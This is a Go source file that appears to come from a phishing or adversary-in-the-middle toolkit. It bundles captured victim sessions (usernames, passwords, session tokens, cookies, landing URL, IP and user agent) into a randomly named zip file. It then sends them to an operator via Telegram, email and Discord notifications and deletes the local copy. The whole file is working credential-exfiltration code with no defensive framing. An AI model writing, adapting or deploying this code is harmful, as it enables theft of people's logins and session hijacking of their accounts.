package main

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}

func createZipFile(session Session) (string, error) {
	// Create a random zip file name
	zipFileName := generateRandomString() + ".zip"
	zipFilePath := filepath.Join(os.TempDir(), zipFileName)

	// Create a new zip file
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create zip file: %v", err)
	}
	defer zipFile.Close()

	// Initialize the zip writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	// Define the file names for each token
	files := map[string][]byte{
		"Tokens-" + generateRandomString() + ".txt":    tokensJSON,
		"HTTPTokens-" + generateRandomString() + ".txt": httpTokensJSON,
		"BodyTokens-" + generateRandomString() + ".txt": bodyTokensJSON,
		"Custom-" + generateRandomString() + ".txt":     customJSON,
		"SessionID-" + generateRandomString() + ".txt":   []byte(session.SessionID),
	}

	// Add each token as a text file to the zip
	for fileName, fileContent := range files {
		fileWriter, err := zipWriter.Create(fileName)
		if err != nil {
			return "", fmt.Errorf("failed to create zip entry for %s: %v", fileName, err)
		}

		// Write content into the zip entry
		_, err = fileWriter.Write(fileContent)
		if err != nil {
			return "", fmt.Errorf("failed to write content to %s: %v", fileName, err)
		}
	}

	return zipFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("✨ Session Information ✨\n\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n" +
		"📦 Token files are zipped and attached separately in message.\n",
		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	// Format the session message
	message := formatSessionMessage(session)

	// Create the zip file with token data
	zipFilePath, err := createZipFile(session)
	if err != nil {
		fmt.Println("Error creating zip file:", err)
		return
	}

	// Include the zip file path in the message
	// message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", zipFilePath)

	// Print the formatted message with zip info
	fmt.Printf("------------------------------------------------------\n")
	fmt.Printf("Latest Session:\n")
	fmt.Printf(message)
	fmt.Printf("------------------------------------------------------\n")

	// Check if the username and password are not empty before sending the Telegram notification
	if session.Username != "" && session.Password != "" {
		// Send notifications based on config
		if config.TelegramEnable {
			sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, zipFilePath)
			if err != nil {
				fmt.Printf("Error sending Telegram notification: %v\n", err)
			}
		}
	} else {
		fmt.Println("Skipping Telegram notification: Username or Password is empty.")
	}

	if config.MailEnable {
		err := sendMailNotificationWithAttachment(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message, zipFilePath)
		if err != nil {
			fmt.Printf("Error sending Mail notification: %v\n", err)
		}
	}

	if config.DiscordEnable {
		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, zipFilePath)
	}

	// After sending, delete the zip file
	err = os.Remove(zipFilePath)
	if err != nil {
		fmt.Printf("Error deleting zip file: %v\n", err)
	} else {
		fmt.Println("Zip file deleted successfully.")
	}
}
